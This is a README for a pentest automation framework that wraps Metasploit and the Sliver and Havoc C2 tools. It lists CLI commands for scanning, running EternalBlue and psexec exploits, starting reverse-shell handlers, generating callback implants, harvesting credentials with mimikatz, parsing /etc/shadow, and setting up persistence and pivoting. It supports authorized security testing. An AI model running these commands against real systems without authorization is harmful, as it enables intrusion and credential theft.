# MSF-COMMANDER v2 — Pentest Automation Framework

## What Changed from v1

| v1 (msf_commander.py) | v2 (msf-commander-v2/) |
|---|---|
| Single monolithic script | Modular architecture (8 modules) |
| Outdated msfvenom templates | C2 Bridge (Sliver/Havoc) — unique compiled binaries |
| No data persistence | SQLite database — all findings saved automatically |
| Manual log files | Event system with full audit trail |
| No workflow automation | YAML playbook engine |
| Basic text output | Professional HTML reports with risk scoring |
| No credential management | Credential vault with hashcat/john export |
| No loot tracking | Loot manager with type-based cataloging |

## Architecture

```
msf-commander-v2/
├── msf_commander.py              # Main CLI entry point
├── requirements.txt              # Python dependencies
├── core/
│   └── engine.py                 # SQLite DB, EventBus, EngagementManager, TargetManager
├── modules/
│   ├── recon.py                  # nmap, DNS, SMB, HTTP headers, dir brute force
│   ├── exploit.py                # MSF exploit execution, session mgmt, pivoting
│   ├── privesc.py                # WinPEAS, LinPEAS, MSF local_exploit_suggester
│   ├── vault.py                  # Credential vault + Loot manager
│   ├── c2_bridge.py              # Sliver & Havoc C2 integration
│   ├── playbook.py               # YAML workflow automation engine
│   └── report.py                 # HTML + JSON report generation
├── playbooks/
│   └── examples.yaml             # 3 example playbooks
├── data/                         # SQLite database (commander.db)
├── reports/                      # Generated HTML/JSON reports
├── payloads/                     # Generated C2 implants
├── loot/                         # Collected evidence
└── logs/                         # Resource scripts, scan outputs
```

## Installation (Kali Linux)

```bash
# Copy to Kali
scp -r msf-commander-v2/ kali@kali:/opt/msf-commander/

# On Kali
cd /opt/msf-commander
pip3 install -r requirements.txt

# Verify Metasploit
msfconsole --version

# Install Sliver C2 (optional but recommended)
sudo apt install sliver

# (Optional) Add to PATH
echo 'alias msf-cmd="python3 /opt/msf-commander/msf_commander.py"' >> ~/.bashrc
source ~/.bashrc
```

## Quick Start

```bash
# 1. Create engagement
python3 msf_commander.py init "Client Corp Assessment" --scope "10.0.0.0/24" --client "Acme Corp"

# 2. Reconnaissance
python3 msf_commander.py recon nmap 10.0.0.0/24 --ports 1-10000
python3 msf_commander.py recon smb 10.0.0.0/24
python3 msf_commander.py recon suggest

# 3. View dashboard
python3 msf_commander.py status

# 4. Exploit
python3 msf_commander.py exploit run exploit/windows/smb/ms17_010_eternalblue RHOSTS=10.0.0.50 LHOST=10.0.0.5

# 5. Post-exploitation
python3 msf_commander.py privesc suggester --session 1
python3 msf_commander.py session post --session 1 --category credentials

# 6. Credentials
python3 msf_commander.py creds list
python3 msf_commander.py creds export-hashcat

# 7. Generate report
python3 msf_commander.py report html
```

## Complete Command Reference

### Engagement Management
```bash
python3 msf_commander.py init "Engagement Name" --client "Client" --scope "10.0.0.0/24" --notes "Notes"
python3 msf_commander.py status
```

### Reconnaissance
```bash
python3 msf_commander.py recon nmap TARGET --ports 1-10000        # Full scan
python3 msf_commander.py recon quick TARGET                       # Common ports only
python3 msf_commander.py recon stealth TARGET                     # SYN scan
python3 msf_commander.py recon udp TARGET                         # UDP scan
python3 msf_commander.py recon smb TARGET                         # SMB enum + enum4linux
python3 msf_commander.py recon dns DOMAIN                         # DNS + subdomain brute
python3 msf_commander.py recon headers https://target.com         # Security headers
python3 msf_commander.py recon dirs https://target.com            # Directory brute force
python3 msf_commander.py recon suggest                            # Suggest exploits from DB
```

### Exploitation
```bash
python3 msf_commander.py exploit search smb                     # Search modules
python3 msf_commander.py exploit search eternalblue --type exploit
python3 msf_commander.py exploit options exploit/windows/smb/psexec
python3 msf_commander.py exploit run exploit/windows/smb/psexec RHOSTS=10.0.0.50 SMBUser=admin SMBPass=pass
python3 msf_commander.py exploit handler --payload windows/x64/meterpreter/reverse_tcp --lhost 10.0.0.5 --lport 4444
```

### Session Management
```bash
python3 msf_commander.py session list                         # List MSF sessions
python3 msf_commander.py session post --session 1 --category enumerate    # Run all enum modules
python3 msf_commander.py session post --session 1 --category credentials  # Harvest creds
python3 msf_commander.py session post --session 1 --category persistence  # Persistence
python3 msf_commander.py session post --session 1 --category lateral      # Lateral movement
python3 msf_commander.py session post --session 1 --category privesc      # Privilege esc
python3 msf_commander.py session modules --category enumerate  # List post modules
python3 msf_commander.py session post --session 1 --module post/windows/gather/credentials/mimikatz
```

### Privilege Escalation
```bash
python3 msf_commander.py privesc suggester --session 1    # MSF local_exploit_suggester
python3 msf_commander.py privesc quick --session 1        # Quick meterpreter checks
python3 msf_commander.py privesc winpeas --session 1      # WinPEAS guide
python3 msf_commander.py privesc parse-winpeas --file loot/peas.txt
python3 msf_commander.py privesc linpeas --session 1      # LinPEAS guide
python3 msf_commander.py privesc parse-linpeas --file loot/peas.txt
python3 msf_commander.py privesc linenum --session 1      # LinEnum guide
```

### Credential Vault
```bash
python3 msf_commander.py creds list                        # Show all credentials
python3 msf_commander.py creds add -u admin -p password123 -s manual -r DOMAIN
python3 msf_commander.py creds add -u admin -t NTLM --hash "aad3b435b51404ee:aad3b435b51404ee"
python3 msf_commander.py creds hashdump --source hashdump   # Parse hashdump from stdin
python3 msf_commander.py creds shadow --file /etc/shadow   # Parse shadow file
python3 msf_commander.py creds export-hashcat              # Export for hashcat
python3 msf_commander.py creds export-john                 # Export for John the Ripper
python3 msf_commander.py creds crack -u admin -p Password1 # Mark hash as cracked
```

### Loot Manager
```bash
python3 msf_commander.py loot list                        # All loot items
python3 msf_commander.py loot list --type implant          # Filter by type
python3 msf_commander.py loot summary                      # Summary by type
```

### C2 Framework Bridge
```bash
python3 msf_commander.py c2 compare                       # Compare C2 frameworks
python3 msf_commander.py c2 status                        # Check installed C2 tools
python3 msf_commander.py c2 sliver-generate --os windows --arch amd64 --host 10.0.0.5 --port 443 --mtls
python3 msf_commander.py c2 havoc-guide                    # Havoc implant guide
python3 msf_commander.py c2 setup --framework sliver       # Setup guide
```

### Network Pivoting
```bash
python3 msf_commander.py pivot route --session 1 --subnet 10.1.0.0/24
python3 msf_commander.py pivot socks --session 1 --version 4 --port 1080
```

### Playbook Automation
```bash
python3 msf_commander.py playbook list                     # List playbooks
python3 msf_commander.py playbook example                  # Create example playbook
python3 msf_commander.py playbook run example_internal_windows
python3 msf_commander.py playbook run my_playbook --dry-run
python3 msf_commander.py playbook show example_internal_windows
```

### Reporting
```bash
python3 msf_commander.py report html                       # Generate HTML report
python3 msf_commander.py report json                       # Generate JSON report
```

### Targets & Vulnerabilities
```bash
python3 msf_commander.py targets --list                    # All discovered targets
python3 msf_commander.py targets --detail TARGET_ID        # Target details + vulns
python3 msf_commander.py targets --services TARGET_ID      # Target services
python3 msf_commander.py vulns                             # All vulnerabilities
```

## Database Schema

All data is stored in `data/commander.db` (SQLite):

| Table | Purpose |
|---|---|
| engagements | Pentest engagement tracking |
| targets | Discovered hosts (IP, hostname, OS, MAC) |
| services | Open ports, services, versions, banners |
| vulnerabilities | CVEs, severity, descriptions, remediations |
| credentials | Harvested usernames, hashes, passwords |
| sessions | Active/past shell sessions |
| loot | Collected files, implants, screenshots |
| events | Full audit trail of all framework actions |
| notes | Operator notes per engagement |

## Why v2 Is Better

1. **Unique binaries** — Sliver/Havoc generate compiled implants, not static msfvenom templates
2. **Persistent data** — Everything saved to SQLite, survives restarts
3. **Audit trail** — Every action logged with timestamps
4. **Workflow automation** — YAML playbooks chain recon → exploit → privesc → report
5. **Professional reports** — Risk-scored HTML reports ready for clients
6. **Credential management** — Centralized vault with hashcat/john export
7. **Modular** — Easy to extend with new modules
